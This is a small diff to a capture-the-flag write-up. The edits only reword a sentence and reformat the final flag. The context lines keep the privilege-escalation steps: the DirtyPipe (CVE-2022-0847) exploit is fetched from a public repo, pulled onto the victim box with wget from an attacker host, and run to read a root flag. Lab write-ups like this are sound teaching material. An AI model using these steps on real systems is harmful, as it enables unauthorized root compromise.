@@ -250,7 +250,7 @@ Analyzing the output we have first suggestion for [CVE-2022-0847] DirtyPipe:
 
 reference: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
 
-we follow the steps in GitHub repo and we have `exploit-1`, `exploit-2`. transfer this to victim machine and run this.
+we follow the steps in GitHub repo and we have `exploit-1`, `exploit-2`. transfer this to victim machine and run.
 
 ```Shell
 www-data@heathrow-VirtualBox:/tmp$ wget 192.168.1.12/exploit-2
@@ -277,7 +277,6 @@ cat /home/heathrow/flag.txt
 flag{box_cracked_successfully_report_to_admin}challenge
 ```
 
-flag:
-```
-flag{box_cracked_successfully_report_to_admin}challenge
-```
+---
+
+flag: ``` flag{box_cracked_successfully_report_to_admin}challenge ```
